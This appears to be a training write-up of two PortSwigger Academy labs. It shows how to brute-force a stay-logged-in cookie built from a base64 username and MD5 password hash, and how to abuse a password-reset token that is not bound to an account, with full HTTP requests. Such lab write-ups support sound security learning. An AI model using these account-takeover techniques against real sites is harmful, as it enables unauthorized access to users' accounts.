---
title: Portswigger Other Auth Mechanisms Labs
date: 2026-10-11
categories:
  - - Writeups
tags:
  - Web
  - "#Portswigger"
cover: /images/rize.jpg
---

Tackling Vulnerabilities in Other Auth Mechanisms Labs from Portswigger

<!-- more -->

---

## Lab: Brute-forcing a stay-logged-in cookie

Once again we are provided with valid logins `wiener:peter`  . When logging in , there is a checkbox `stay-logged-in` which we check since that's what we are testing for. Inspecting the HTTP response:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=tYJup8qSWknnnBd6X9vr3YrjZdwYM0gc; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

We get the cookie value `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw` which is base-64 encoded and decodes to `wiener:51dc30ddc473d43a6011e9ebba6ca770` . The first part is our username and the second part is a hash. When we look up on a [hash identifier](https://hashes.com/en/tools/hash_identifier) , we learn that its a MD5 hash. Decoding it gives `peter` , our password. So now that we know the formula for creating the cookie time to bruteforce it.

The thing about how a stay-logged-in cookie works is that it should authenticate the user irrespective of other session cookies so if we have a correct stay-logged-in cookie of a user we will be able to login as them.

Now to attack `carlos`:

We send this request to intruder and add the stay-logged-in cookie as a position:

```http
GET /my-account?id=carlos HTTP/2
Host: 0a73009d04e0932f81372f5e00ce007b.web-security-academy.net
Cookie: session=Qs1FtRV5aabqVD4gtpRiaWKFaL2nyg17; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

On intruder , We need to set a few payload processing rules as follows:

![](images/payload_processing.png)

Also Ensure that you remove `=` from Payload Encoding settings in intruder since the payload will be base64 encoded and this may cause inconsistencies through padding extra `=`

![](images/stay_logged_in.png)

## Lab: Password reset broken logic

As usual the test credentials are `wiener:peter` and the victim account `carlos` . We are testing the password reset functionality , so no need to login . Immediately we get to the login screen , we click `forgot password` and input our username , `wiener` , in the box.

Afterwards we receive a reset url in our email client with the `token` as follows `https://site.net/forgot-password?temp-forgot-password-token=<token>`

At first I tried to decode the token but was unable to figure out the encoding scheme used.

Some little bit brainstorming and i thought to myself , what if the token isn't tied to the account it was requested for? 

I went on to test this by sending the following request:

```http
POST /forgot-password?temp-forgot-password-token=uegdm2os318vvqyuk2hpkiwvrjh34ksy HTTP/2
Host: 0a4300c104a8fadd81c59d8000a00032.web-security-academy.net
Cookie: session=HFiLWwHJQguFTCTlbP4xvIe9Tn3k4oNy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://0a4300c104a8fadd81c59d8000a00032.web-security-academy.net
Referer: https://0a4300c104a8fadd81c59d8000a00032.web-security-academy.net/forgot-password?temp-forgot-password-token=uegdm2os318vvqyuk2hpkiwvrjh34ksy
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=uegdm2os318vvqyuk2hpkiwvrjh34ksy&username=carlos&new-password-1=peter&new-password-2=peter
```

Trying to login with the new `carlos:peter` creds and:

![](images/pass_reset.png)

Looks like our hypothesis was correct , but that's not a good thing lol.

